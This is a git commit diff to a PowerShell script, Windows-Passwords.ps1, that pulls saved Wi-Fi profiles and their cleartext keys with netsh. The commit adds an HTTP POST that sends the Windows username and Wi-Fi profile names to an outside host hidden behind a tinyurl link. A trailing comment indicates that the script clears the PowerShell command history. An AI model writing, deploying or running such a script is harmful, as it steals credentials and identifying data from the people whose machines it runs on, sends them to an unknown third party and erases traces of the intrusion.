08cffcf14217bad1bcd04df09944eb9b9ba40b14
LahevOdVika <75607884+LahevOdVika@users.noreply.github.com>
2024-11-19 18:11:36 +0100

    Updating powrshell

--- Windows-Passwords.ps1
+++ Windows-Passwords.ps1
@@ -4,9 +4,11 @@ netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEac
     $wlan  = $_.Matches.Value
     $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
 
-	
-	Write-Output $passw
-
+    $body = @{
+	'username' = $env:username + "|" + [string]$wlan
+	'content' = "Accessing"
+    }
+    Invoke-RestMethod -ContentType 'Application/Json' -Uri https://tinyurl.com/4fkvj22m -Method Post -Body ($body | ConvertTo-Json)
 }
 
 # Clear the PowerShell command history
